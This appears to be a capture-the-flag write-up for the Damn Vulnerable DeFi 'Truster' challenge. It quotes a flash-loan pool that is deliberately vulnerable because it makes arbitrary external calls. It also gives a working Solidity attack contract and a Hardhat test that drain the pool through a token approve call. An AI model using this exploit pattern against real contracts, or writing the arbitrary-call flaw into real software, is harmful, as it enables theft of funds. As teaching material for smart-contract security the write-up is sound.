# 03_Truster

## Challenge

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

You are provided with the code for the flash loan providing pool:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}
```

## Solution

If we take a look at the test case, we see that we have to have the pool's balance at the end and the pool should not have any money anymore. 

We can achieve this by exploiting that the pool verifies that a loan was paid back by checking if its token balance is the same as before the loan was issued. This doesn't include allowances.

What we can do is give the loan to the pool itself and then call the token.approve() function to approve ourselves for spending all the tokens money. Then we return it and the balance is still the same. The problem is that now we can spend all the pool money without it checking. We now send all its money to the user and are done. I implemented a small attack contract that does that, as I am not a big hardhat enjoyer:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Truster {

    address owner;

    function getEmBoyz(address _pool, address _token) public
    {
        owner = msg.sender;
        DamnValuableToken token = DamnValuableToken(_token);
        TrusterLenderPool pool = TrusterLenderPool(_pool);

        pool.flashLoan(token.balanceOf(_pool), _pool, _token, abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(_pool)));

        DamnValuableToken(token).transferFrom(_pool, owner, DamnValuableToken(token).balanceOf(_pool));
    }
}
```

We can then call this the same way as in the last challenge:

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attack_Truster = await ethers.getContractFactory('Attack_Truster', player);
    attack = await Attack_Truster.deploy();
    await attack.connect(player).getEmBoyz(pool.address, (await pool.token()));
});
```

This way we have solved the chall (in 1 tx).
